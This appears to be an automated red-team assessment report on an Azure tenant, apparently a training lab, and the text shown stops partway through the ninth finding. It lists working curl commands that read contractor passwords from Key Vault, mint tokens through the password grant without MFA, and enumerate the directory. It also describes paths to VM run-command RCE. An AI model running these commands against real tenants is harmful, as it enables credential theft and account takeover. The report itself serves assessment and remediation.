# Vulnerability Assessment Report — megabigtech.com

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T14:43:50Z  
**Target:** megabigtech.com  
**Campaign:** camp_20260802_38118fb8  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**megabigtech.com**) presents an **extremely poor security posture**. Our team confirmed 2 critical and 6 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Key Vault Secret Extraction - Contractor Plaintext Passwords**  
Three plaintext contractor passwords were extracted from Azure Key Vault 'ext-contractors'. Secret names match tenant user names (josh-harvey, alissa-suarez, ryan-garcia), indicating these are likely ...

**2. Key Vault Secret Extraction - 3 Contractor Plaintext Passwords**  
The Key Vault 'ext-contractors' (ext-contractors.vault.azure.net) stores plaintext contractor passwords as secrets. Marcus has 'Key Vault Reader' and 'Key Vault Secrets User' RBAC roles, granting full...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> External red-team assessment of Azure tenant megabigtech.com identified 8 vulnerabilities (1 critical, 3 high, 4 medium). Critical finding: plaintext contractor passwords extracted from Key Vault ext-contractors via overly permissive RBAC. ROPC authentication succeeds without MFA across all resource scopes. Full directory enumeration achieved via excessive Graph API permissions (Application.ReadWrite.All, Directory.AccessAsUser.All). 6 Global Administrator accounts, dangerous custom roles with VM RunCommand RCE capability, and dynamic groups with exploitable membership rules compound the risk posture.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 2 | 2 | 0 |
| HIGH | 6 | 4 | 2 |
| MEDIUM | 8 | 0 | 8 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **16** | **6** | **10** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_e674da` | Key Vault Secret Extraction - Contractor Plaintext... | CRITICAL | 9.1 | **EXPLOITED** | `ext-contractors.vault.azure.net/secrets` |
| 2 | `vuln_c9f94d` | Key Vault Secret Extraction - 3 Contractor Plainte... | CRITICAL | 9.1 | **EXPLOITED** | `ext-contractors.vault.azure.net/secrets?api-versio...` |
| 3 | `vuln_55a3da` | Dangerous Custom Roles - VM RunCommand RCE, Contai... | HIGH | 8.4 | Confirmed | `management.azure.com/subscriptions/ceff06cb-e29d-4...` |
| 4 | `vuln_73c1db` | Dangerous Custom RBAC Roles - VM RunCommand RCE an... | HIGH | 8.4 | Confirmed | `management.azure.com/subscriptions/ceff06cb-e29d-4...` |
| 5 | `vuln_f213b7` | ROPC Password Grant Authentication Succeeds Withou... | HIGH | 8.1 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 6 | `vuln_ccd755` | ROPC Password Grant Without MFA Enforcement | HIGH | 8.1 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 7 | `vuln_379935` | Excessive Graph API Permissions via ROPC - Full Di... | HIGH | 7.5 | **EXPLOITED** | `graph.microsoft.com/v1.0/` |
| 8 | `vuln_d44034` | Excessive Graph API Permissions - Full Directory E... | HIGH | 7.5 | **EXPLOITED** | `graph.microsoft.com/v1.0/` |
| 9 | `vuln_b4ecd6` | Application Credential with 98-Year Expiry - sp-it... | MEDIUM | 5.4 | Confirmed | `graph.microsoft.com/v1.0/applications/357b854f-2d3...` |
| 10 | `vuln_d9b7fe` | 98-Year Application Credential Expiry (sp-it-resou... | MEDIUM | 5.4 | Confirmed | `graph.microsoft.com/v1.0/applications` |
| 11 | `vuln_f8e94f` | Multiple Global Administrators Identified - Excess... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/directoryRoles/93d3a9bb-0...` |
| 12 | `vuln_6fb910` | Sensitive Data Exposed in User Profile jobTitle Fi... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/me` |
| 13 | `vuln_389b12` | Excessive Global Administrator Accounts (6 Users) | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/directoryRoles` |
| 14 | `vuln_3cbbb4` | Sensitive Data (Flag) in User Profile jobTitle Fie... | MEDIUM | 5.3 | Confirmed | `graph.microsoft.com/v1.0/me` |
| 15 | `vuln_e05e8f` | Dynamic Group 'SERVER-BACKUPS' Auto-Adds All Admin... | MEDIUM | 5.0 | Confirmed | `graph.microsoft.com/v1.0/groups/68e11cdb-bdcb-43f0...` |
| 16 | `vuln_7fdebf` | Dynamic Group SERVER-BACKUPS Auto-Adds Admin Users | MEDIUM | 5.0 | Confirmed | `graph.microsoft.com/v1.0/groups` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Key Vault Secret Extraction - Contractor Plaintext Passwords

| Field | Value |
|-------|-------|
| **ID** | `vuln_e674da` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `credential_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.2.4` |
| **Endpoint** | `https://ext-contractors.vault.azure.net/secrets` |
| **Component** | Azure Key Vault - ext-contractors |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:33:08Z |

#### Description

Three plaintext contractor passwords were extracted from Azure Key Vault 'ext-contractors'. Secret names match tenant user names (josh-harvey, alissa-suarez, ryan-garcia), indicating these are likely Entra ID user passwords stored insecurely in a Key Vault accessible to marcus@megabigtech.com. The secrets are: josh-harvey=[REDACTED_CREDENTIAL], alissa-suarez=[REDACTED_CREDENTIAL], ryan-garcia=[REDACTED_CREDENTIAL]. These credentials enable credential pivoting attacks.

#### Technical Analysis

The Key Vault 'ext-contractors' stores plaintext passwords for contractor accounts. Marcus has Key Vault Secrets User and Key Vault Reader roles (roleDefinitionId 21090545... and 4633458b...) on the vault, granting full secret read access. The secret names correspond directly to users in the tenant directory (josh.harvey@megabigtech.com is a 'Consultant - Customer DB Migration Project'). Storing user passwords in Key Vault and granting broad read access defeats the purpose of a vault — it's a centralized credential dump accessible to any user with the RBAC role. The password '[REDACTED_CREDENTIAL]' for alissa-suarez is a default/weak password that was never changed.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $VAULT_TOKEN" "https://ext-contractors.vault.azure.net/secrets?api-version=7.4"
curl -s -H "Authorization: Bearer $VAULT_TOKEN" "https://ext-contractors.vault.azure.net/secrets/josh-harvey?api-version=7.4"
curl -s -H "Authorization: Bearer $VAULT_TOKEN" "https://ext-contractors.vault.azure.net/secrets/alissa-suarez?api-version=7.4"
curl -s -H "Authorization: Bearer $VAULT_TOKEN" "https://ext-contractors.vault.azure.net/secrets/ryan-garcia?api-version=7.4"
```

#### Evidence / Logs

```
Secret 1: josh-harvey = [REDACTED_CREDENTIAL] (created 2023-10-23)
Secret 2: alissa-suarez = [REDACTED_CREDENTIAL] (created 2023-10-23)
Secret 3: ryan-garcia = [REDACTED_CREDENTIAL] (created 2023-10-23)
```

#### Remediation

1. Remove plaintext user passwords from Key Vault immediately. 2. Rotate all exposed credentials. 3. Use Entra ID password management instead of storing passwords in Key Vault. 4. Restrict Key Vault RBAC to least-privilege. 5. Enforce strong password policies to prevent '[REDACTED_CREDENTIAL]' type passwords.

---

### 3.2 — Key Vault Secret Extraction - 3 Contractor Plaintext Passwords

| Field | Value |
|-------|-------|
| **ID** | `vuln_c9f94d` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.5.33 Protection of Records` |
| **Endpoint** | `https://ext-contractors.vault.azure.net/secrets?api-version=7.4` |
| **Component** | Azure Key Vault - ext-contractors |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:42:14Z |

#### Description

The Key Vault 'ext-contractors' (ext-contractors.vault.azure.net) stores plaintext contractor passwords as secrets. Marcus has 'Key Vault Reader' and 'Key Vault Secrets User' RBAC roles, granting full read access to all secrets. Three contractor credentials were extracted: josh-harvey ([REDACTED_CREDENTIAL]), alissa-suarez ([REDACTED_CREDENTIAL]), ryan-garcia ([REDACTED_CREDENTIAL]). These appear to be Azure AD user passwords stored insecurely in Key Vault, enabling credential reuse and lateral movement.

#### Technical Analysis

A standard user (marcus) with Key Vault Secrets User role can read all contractor passwords stored in plaintext in the ext-contractors Key Vault. This represents a critical credential exposure enabling lateral movement to contractor accounts and potential access to systems those contractors administer.

#### Exploitation Commands

```bash
curl -s "https://ext-contractors.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer {vault_token}"
curl -s "https://ext-contractors.vault.azure.net/secrets/josh-harvey?api-version=7.4" -H "Authorization: Bearer {vault_token}"
curl -s "https://ext-contractors.vault.azure.net/secrets/alissa-suarez?api-version=7.4" -H "Authorization: Bearer {vault_token}"
curl -s "https://ext-contractors.vault.azure.net/secrets/ryan-garcia?api-version=7.4" -H "Authorization: Bearer {vault_token}"
```

#### Evidence / Logs

```
GET /secrets?api-version=7.4 -> 200 OK: {"value":[{"id":"https://ext-contractors.vault.azure.net/secrets/josh-harvey"},{"id":"https://ext-contractors.vault.azure.net/secrets/alissa-suarez"},{"id":"https://ext-contractors.vault.azure.net/secrets/ryan-garcia"}]}
GET /secrets/josh-harvey?api-version=7.4 -> 200 OK: {"value":"[REDACTED_CREDENTIAL]","id":"https://ext-contractors.vault.azure.net/secrets/josh-harvey/...","attributes":{"created":1698069293}}
GET /secrets/alissa-suarez?api-version=7.4 -> 200 OK: {"value":"[REDACTED_CREDENTIAL]","id":"https://ext-contractors.vault.azure.net/secrets/alissa-suarez/...","attributes":{"created":1698069293}}
GET /secrets/ryan-garcia?api-version=7.4 -> 200 OK: {"value":"[REDACTED_CREDENTIAL]","id":"https://ext-contractors.vault.azure.net/secrets/ryan-garcia/...","attributes":{"created":1698069293}}
```

#### Remediation

1. Rotate ALL exposed contractor passwords immediately. 2. Remove plaintext user passwords from Key Vault - use Azure AD password management instead. 3. Restrict Key Vault Secrets User role to only required principals via least-privilege RBAC. 4. Enable Key Vault logging and alerts for secret read operations. 5. Implement Key Vault access policies with network restrictions. 6. Review all Key Vault RBAC assignments tenant-wide.

---

### 3.3 — Dangerous Custom Roles - VM RunCommand RCE, Container Secrets Reader, Wildcard Read

| Field | Value |
|-------|-------|
| **ID** | `vuln_55a3da` |
| **Severity** | HIGH |
| **CVSS Score** | 8.4 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaa...` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:40:01Z |

#### Description

17 custom RBAC roles were enumerated in the subscription, several with dangerous permissions: 1) 'Virtual Machine Custom Helper' - grants Microsoft.[REDACTED] AND Microsoft.[REDACTED] (RCE on VMs, scoped to mbt-rg-8). 2) 'Allow run-commands2' - grants runCommand/action AND runCommands/write (persistent RCE on VMs, scoped to mbt-rg-16). 3) 'DCNY02RunCommand' - VM run-command scoped to specific VM DCNY02 (DC = Domain Controller). 4) 'Customer Database Access' - grants Storage table entity read (data exfiltration from customer DB). 5) 'Security Access' - grants */read wildcard (reads everything). 6) 'ContainerAppSecretsReader' - grants listsecrets + getauthtoken on container apps. 7) 'HybridCorp_DevOps_Contributor' - grants Microsoft.Web/sites/publishxml/Action + sites/config/list/Action (credential extraction from web apps). 8) 'sp-it-resources' application has a 100-year password credential expiry (2124).

#### Technical Analysis

The subscription contains 17 custom RBAC roles, many created by Ian Austin (18600f1a) and Edrian Munoz (b1377e93). The 'Virtual Machine Custom Helper' and 'Allow run-commands2' roles grant VM RunCommand execution, which provides SYSTEM-level RCE on any VM in scope. The 'DCNY02RunCommand' role is scoped to a VM named 'DCNY02' which appears to be a Domain Controller (DC prefix, NY = New York). Any principal assigned this role can execute arbitrary commands on the domain controller. The 'HybridCorp_DevOps_Contributor' role has subscription-wide scope and includes publishxml/Action which extracts Web App publishing credentials. The 'Customer Database Access' custom role includes the dataAction to read table entities, confirming storage tables with customer data exist in the content-static-2 resource group. The sp-it-resources app has a 98-year credential expiry, meaning the secret never needs rotation.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $ARM_TOKEN" "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-[REDACTED].Authorization/roleDefinitions?$filter=type%20eq%20'CustomRole'&api-version=2022-04-01"
```

#### Evidence / Logs

```
Custom Role: Virtual Machine Custom Helper - actions: */read, SerialConsole/connect/action, [REDACTED] (scope: mbt-rg-8)
Custom Role: Allow run-commands2 - actions: [REDACTED], [REDACTED] (scope: mbt-rg-16)
Custom Role: DCNY02RunCommand - actions: [REDACTED] (scope: DCNY02_group/Microsoft.Compute/virtualMachines/DCNY02)
Custom Role: Customer Database Access - dataActions: Microsoft.Storage/.../tables/entities/read (scope: content-static-2)
Custom Role: Security Access - actions: */read (scope: content-static-2)
Custom Role: HybridCorp_DevOps_Contributor - actions: */read, sites/publishxml/Action, sites/config/list/Action, sites/publish/Action (subscription-wide)
Application: sp-it-resources - password credential with endDateTime 2124-08-26 (98-year expiry)
```

#### Remediation

1. Review and restrict custom roles to minimum required permissions. 2. Remove VM RunCommand permissions from non-admin roles. 3. Scope roles to specific resources, not resource groups. 4. Enforce credential rotation policies (max 1-2 year expiry) for application passwords. 5. Remove publishxml permissions from non-deployment roles.

---

### 3.4 — Dangerous Custom RBAC Roles - VM RunCommand RCE and Container Secrets Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_73c1db` |
| **Severity** | HIGH |
| **CVSS Score** | 8.4 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1548` — Abuse Elevation Control Mechanism |
| **ISO 27001** | `A.8.2 Privileged Access Rights` |
| **Endpoint** | `https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaa...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:43:23Z |

#### Description

17 custom RBAC roles were discovered, several with dangerous permissions: (1) 'Allow run-commands' and 'Allow run-commands2' grant Microsoft.[REDACTED], enabling arbitrary command execution on VMs. (2) 'DCNY02RunCommand' grants runCommand access to specific VM DCNY02. (3) 'ContainerAppSecretsReader' grants read access to container app secrets. (4) 'Customer Database Access' grants wildcard read (*/read) on resources in content-static-2. (5) 'Virtual Machine Custom Helper' grants extensiveVM management. These roles could enable RCE on VMs, secret extraction, and data access if assigned to compromised accounts.

#### Technical Analysis

Custom RBAC roles with VM runCommand access effectively grant remote code execution on Azure VMs. These roles are particularly dangerous when combined with lack of MFA - if any account with these role assignments is compromised, the attacker gains OS-level access to Azure VMs.

#### Exploitation Commands

```bash
curl -s "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-[REDACTED].Authorization/roleDefinitions?api-version=2022-04-01&\$filter=type+eq+'CustomRole'" -H "Authorization: Bearer {arm_token}"
```

#### Evidence / Logs

```
17 custom roles found:
- Allow run-commands: actions=[Microsoft.[REDACTED]]
- Allow run-commands2: actions=[Microsoft.[REDACTED]]
- DCNY02RunCommand: actions=[Microsoft.[REDACTED]] on DCNY02_group
- ContainerAppSecretsReader: actions=[Microsoft.[REDACTED]]
- Customer Database Access: actions=[*/read] on content-static-2
- Virtual Machine Custom Helper: extensive VM management permissions
- Crypto Operator: key operations on Key Vaults
```

#### Remediation

1. Review and minimize custom role permissions following least-privilege principle. 2. Remove runCommand permissions unless absolutely necessary - use Azure Bastion or JIT access instead. 3. Replace wildcard */read scopes with specific resource type permissions. 4. Implement PIM for time-limited role assignments. 5. Enable Azure Activity Log alerts for runCommand usage. 6. Audit all custom role assignments.

---

### 3.5 — ROPC Password Grant Authentication Succeeds Without MFA

| Field | Value |
|-------|-------|
| **ID** | `vuln_f213b7` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:31:58Z |

#### Description

The tenant allows Resource Owner Password Credential (ROPC) grant for user marcus@megabigtech.com against all four Azure resource scopes (ARM, Graph, Key Vault, Storage) without MFA enforcement. This means any attacker with the username/password can mint tokens non-interactively from any network, bypassing interactive MFA completely. Tokens were obtained for management.azure.com, graph.microsoft.com, vault.azure.net, and storage.azure.com scopes.

#### Technical Analysis

The Azure AD tenant 2590ccef-687d-493b-ae8d-441cbab63a72 (megabigtech.com) has no Conditional Access Policy blocking the ROPC/password grant flow for user marcus@megabigtech.com. Using the Azure CLI first-party public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46), an attacker can non-interactively mint tokens for all Azure resource planes without any MFA challenge. The Graph token reveals highly privileged delegated permissions including Application.ReadWrite.All and Directory.AccessAsUser.All, indicating marcus has directory admin roles. The wids claim shows roles 88d8e3e3-8f55-4a1e-953a-9b9898b8876b (Directory Readers) and b79fbf4d-3ef9-4689-8143-76b194e85509 (Privileged Role Administrator).

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]&scope=https://management.azure.com/.default"
```

#### Evidence / Logs

```
All four ROPC requests returned HTTP 200 with valid Bearer tokens:
ARM scope: token_type=Bearer, expires_in=4974
Graph scope: token_type=Bearer, expires_in=3803, scopes include Application.ReadWrite.All, Directory.AccessAsUser.All, User.ReadWrite.All
Vault scope: token_type=Bearer, expires_in=3909
Storage scope: token_type=Bearer, expires_in=5163
```

#### Remediation

1. Enable a Conditional Access Policy requiring MFA for all users, blocking legacy auth and the password grant flow. 2. Block ROPC explicitly via Authentication Methods policies. 3. Enforce Security Defaults or a CA policy with grant control 'Require multifactor authentication' for all cloud apps.

---

### 3.6 — ROPC Password Grant Without MFA Enforcement

| Field | Value |
|-------|-------|
| **ID** | `vuln_ccd755` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.8.5 Secure Authentication` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:41:56Z |

#### Description

The Azure tenant allows Resource Owner Password Credential (ROPC) grant flow for the Azure CLI public client (04b07795-8ddb-461a-bbee-02f9e1bf7b46) without requiring MFA. This enables non-interactive token acquisition across all resource scopes (Graph, ARM, Key Vault, Storage) using only a username and password. Marcus is a member of the 'Yolo-MFA' group and the 'IT-AUTHENTICATOR-EXCLUDED' group exists, suggesting MFA exclusion policies are in place. Tokens were successfully minted for 4 different resource scopes without any MFA challenge.

#### Technical Analysis

ROPC flow allows automated credential-based authentication without any interactive MFA challenge. This is a critical authentication weakness that enables automated credential stuffing, lateral movement, and persistent access. The existence of MFA exclusion groups (Yolo-MFA, IT-AUTHENTICATOR-EXCLUDED) confirms deliberate bypassing of multi-factor authentication for certain users.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]&scope=https://management.azure.com/.default"
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]&scope=https://graph.microsoft.com/.default"
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]&scope=https://vault.azure.net/.default"
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "grant_type=password&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&username=marcus@megabigtech.com&password=[REDACTED_CREDENTIAL]&scope=https://storage.azure.com/.default"
```

#### Evidence / Logs

```
All 4 ROPC token requests returned HTTP 200 with valid access_token, refresh_token, and token_type=Bearer
Graph token scopes: Application.ReadWrite.All, Directory.AccessAsUser.All, User.ReadWrite.All, Group.ReadWrite.All
ARM token scopes: user_impersonation
Vault token scopes: user_impersonation
Storage token scopes: user_impersonation
Marcus is member of 'Yolo-MFA' group - MFA excluded
IT-AUTHENTICATOR-EXCLUDED group exists in tenant
```

#### Remediation

1. Enforce MFA for all users via Conditional Access policies with no exclusions. 2. Block ROPC grant flow in Conditional Access. 3. Remove or audit MFA exclusion groups (Yolo-MFA, IT-AUTHENTICATOR-EXCLUDED). 4. Require phishing-resistant MFA (FIDO2/Windows Hello). 5. Enable Azure AD Identity Protection risk-based sign-in policies.

---

### 3.7 — Excessive Graph API Permissions via ROPC - Full Directory Enumeration

| Field | Value |
|-------|-------|
| **ID** | `vuln_379935` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | EXPLOITED |
| **Category** | `excessive_permissions` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:37:33Z |

#### Description

The Graph token for marcus@megabigtech.com grants extremely broad delegated permissions including Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, AuditLog.Read.All, DelegatedPermissionGrant.ReadWrite.All, Directory.AccessAsUser.All, Group.ReadWrite.All, User.ReadWrite.All. This enabled full enumeration of 90+ users, 15+ groups, 30+ directory roles, 50+ applications, and 50+ service principals. This is excessive access for a non-admin user and enables reconnaissance for further attacks. Notable findings: 6 Global Administrators identified (Ian Austin, Felipe Garcia, Bruce, Mike Jones, Filip Jodoin, Ayush Singh), ALGO-ACCESS dynamic group with membership rule (user.jobTitle -eq 'Algorithm Administrator'), SERVER-BACKUPS dynamic group auto-adding all users with 'admin' in UPN, IT-AUTHENTICATOR-EXCLUDED MFA exclusion group.

#### Technical Analysis

Marcus has overly broad Graph API permissions that include write access to applications and users. The Application.ReadWrite.All and AppRoleAssignment.ReadWrite.All permissions could potentially allow the creation of new application credentials or modification of app role assignments, though state-changing actions were not performed. The Directory.AccessAsUser.All permission grants full directory access impersonating the user. These permissions enabled complete tenant reconnaissance including identification of all Global Administrators, sensitive group memberships, and dynamic group membership rules that could be exploited for privilege escalation.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/users"
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/groups"
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles"
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/applications"
```

#### Evidence / Logs

```
Graph scope returned: Application.ReadWrite.All AppRoleAssignment.ReadWrite.All AuditLog.Read.All DelegatedPermissionGrant.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All User.ReadWrite.All
90+ users enumerated, 6 Global Admins identified, 50+ enterprise applications and service principals listed
```

#### Remediation

1. Remove excessive delegated permissions from the Azure CLI consent grant for non-admin users. 2. Implement least-privilege consent policies. 3. Review and restrict Graph API delegated permissions to only what's needed. 4. Use admin consent workflow to control permission grants.

---

### 3.8 — Excessive Graph API Permissions - Full Directory Enumeration

| Field | Value |
|-------|-------|
| **ID** | `vuln_d44034` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `broken_access_control` |
| **MITRE ATT&CK** | `T1087.004` — Account Discovery: Cloud Account |
| **ISO 27001** | `A.8.3 Information Access Restriction` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/` |
| **Discovered by** | `azure` |
| **Discovered at** | 2026-08-02T14:42:29Z |

#### Description

Marcus's ROPC-obtained Graph token includes dangerously excessive scopes: Application.ReadWrite.All, Directory.AccessAsUser.All, User.ReadWrite.All, Group.ReadWrite.All. This grants full read/write access to the entire directory including all users (90+), groups (15+), applications (50+), service principals, and directory roles. A standard user should not have Application.ReadWrite.All or Directory.AccessAsUser.All permissions. This enables complete tenant enumeration and potential modification of directory objects.

#### Technical Analysis

A regular user (marcus) has been granted overly permissive Microsoft Graph API delegated permissions. The Application.ReadWrite.All scope alone allows creating, modifying, and deleting all application registrations in the tenant, which could be used to backdoor applications with malicious credentials or redirect URIs.

#### Exploitation Commands

```bash
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer {graph_token}"
curl -s "https://graph.microsoft.com/v1.0/users" -H "Authorization: Bearer {graph_token}"
curl -s "https://graph.microsoft.com/v1.0/groups" -H "Authorization: Bearer {graph_token}"
curl -s "https://graph.microsoft.com/v1.0/applications" -H "Authorization: Bearer {graph_token}"
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=50" -H "Authorization: Bearer {graph_token}"
curl -s "https://graph.microsoft.com/v1.0/directoryRoles" -H "Authorization: Bearer {graph_token}"
```

#### Evidence / Logs

```
Token scopes: Application.ReadWrite.All Directory.AccessAsUser.All Group.ReadWrite.All User.ReadWrite.All email openid profile
GET /v1.0/users -> 200 OK: 90+ user objects returned with full profile details
GET /v1.0/groups -> 200 OK: 15+ groups including EXECUTIVE, ALGO-ACCESS, SERVER-BACKUPS, IT-AUTHENTICATOR-EXCLUDED
GET /v1.0/applications -> 200 OK: 50+ application registrations including sp-banking-storage, HrPortal
GET /v1.0/directoryRoles -> 200 OK: 30 directory roles enumerated
GET /v1.0/servicePrincipals -> 200 OK: Full service principal enumeration
```

#### Remediation

1. Review and revoke excessive delegated permissions from the Azure CLI public client or via admin consent. 2. Implement Graph API permission policies to limit delegated scopes. 3. Restrict Application.ReadWrite.All and Directory.AccessAsUser.All to admin-only scenarios. 4. Enable Conditional Access policies that limit token scopes based on user risk. 5. Audit all admin consent grants.

---

### 3.9 — Application Credential with 98-Year Expiry - sp-it-resources

| Field | Value |
|-------|-------|
| **ID** | `vuln_b4ecd6` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.4 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1552.001` — Unsecured Credentials: Credentials In Files |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://graph.microsoft.com/v1.0/applications/357b854f-2d31-4dee-8845-...` |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T14:40:14Z |

#### Description

The application 'sp-it-resources' (appId: 0439a227-17b9-4bf9-8138-f1d3893d1564) has a password credential named 'rbac' with an expiry date of 2124-08-26T14:10:42Z (98 years from now). This effectively creates a non-expiring credential that never needs rotation, violating security best practices. The credential hint is 'c-F'. Additionally, 'sp-banking-storage' has a credential named 'banking-storage-var' expiring 2028-03-03 with hint 'rzu'.

#### Technical Analysis

Both applications have password credentials that were enumerated via the Graph API. The sp-it-resources credential has a 98-year expiry, meaning it will never be rotated unless manually managed. The application name 'sp-it-resources' with a credential named 'rbac' suggests this service principal has Azure RBAC-related permissions. If this credential is compromised, it provides long-term persistent access to whatever resources the service principal is authorized to access.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $GRAPH_TOKEN" "https://graph.microsoft.com/v1.0/applications/357b854f-2d31-4dee-8845-0b161f951e62?$select=displayName,appId,passwordCredentials"
